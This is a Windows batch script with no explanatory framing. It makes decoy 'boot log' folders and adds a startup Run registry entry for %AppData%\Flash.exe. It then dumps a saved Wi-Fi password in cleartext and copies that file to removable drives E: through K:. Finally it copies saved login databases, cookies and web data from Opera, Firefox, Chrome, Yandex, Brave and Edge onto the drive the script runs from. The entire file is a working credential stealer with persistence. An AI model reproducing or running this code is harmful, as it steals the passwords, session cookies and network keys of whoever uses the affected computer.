@echo off
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x01
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x02
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x03
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x04
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x05
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x06
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x07
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x08
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x09
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x10
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11    
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x12
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x13
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x14
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x15
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x16
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x17
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x18
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x19
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x20
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x21
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x22
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x23
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x24
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x25
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x26
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x27
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x28
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x29
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x30
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x31
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x32
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x33
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x34
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x35
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x36
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x37
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x38
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x39
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x40
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x41
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x42
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x43
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x44
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x45
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x46
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x47
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x48
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x49
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x50
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x51
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x52
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x53
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x54
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x55
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x56
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x57
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x58
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x59
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x60
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x61
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x62
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x63
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x64
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x65
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x66
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x67
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x68
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x69
md C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x70

md C:\WindowsBootLogs\ShellLogs\CheckLog

REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DesktopLauncher /d %AppData%\Flash.exe /f 

netsh wlan show profile ESPD key=clear >> C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt

netsh wlan show profile ESPD key=clear >> C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt

copy C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt E:\
copy C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt F:\
copy C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt G:\
copy C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt H:\
copy C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt I:\
copy C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt J:\
copy C:\WindowsBootLogs\ShellLogs\ExGol\Windows0x11\0log.txt K:\

set folderName=Check
md %~d0\bin\%folderName%
md %~d0\bin\%folderName%\Mozilla
md %~d0\bin\%folderName%\Opera
md %~d0\bin\%folderName%\Google
md %~d0\bin\%folderName%\Yandex
md %~d0\bin\%folderName%\Brave
md %~d0\bin\%folderName%\Edge
CD "%appdata%\Opera software\Opera stable\"
copy /y "login data" %~d0\bin\%folderName%\Opera\
copy /y "Cookies" %~d0\bin\%folderName%\Opera\
copy /y "Web Data" %~d0\bin\%folderName%\Opera\	
echo off
CD %appdata%\Mozilla\Firefox\Profiles\*.default
copy /y cookies.sqlite %~d0\bin\%folderName%\Mozilla
copy /y key3.db %~d0\bin\%folderName%\Mozilla
copy /y signons.sqlite %~d0\bin\%folderName%\Mozilla
echo off
CD "%localappdata%\Google\Chrome\User Data\Default"
copy /y "Login Data" %~d0\bin\%folderName%\Google
copy /y "Cookies" %~d0\bin\%folderName%\Google
copy /y "Web Data" %~d0\bin\%folderName%\Google
echo off
CD "%localappdata%\Yandex\YandexBrowser\User Data\Default\"
copy /y "Ya Login Data" %~d0\bin\%folderName%\Yandex
copy /y "Login Data" %~d0\bin\%folderName%\Yandex
copy /y "Cookies" %~d0\bin\%folderName%\Yandex
copy /y "Web Data" %~d0\bin\%folderName%\Yandex
echo off
CD "%localappdata%\BraveSoftware\Brave-Browser\User Data\Default"
copy /y "Login Data" %~d0\bin\%folderName%\Brave
copy /y "Cookies" %~d0\bin\%folderName%\Brave
copy /y "Web Data" %~d0\bin\%folderName%\Brave
echo off
CD "%localappdata%\Microsoft\Edge\User Data\Default"
copy /y "Login Data" %~d0\bin\%folderName%\Edge
copy /y "Cookies" %~d0\bin\%folderName%\Edge
copy /y "Web Data" %~d0\bin\%folderName%\Edge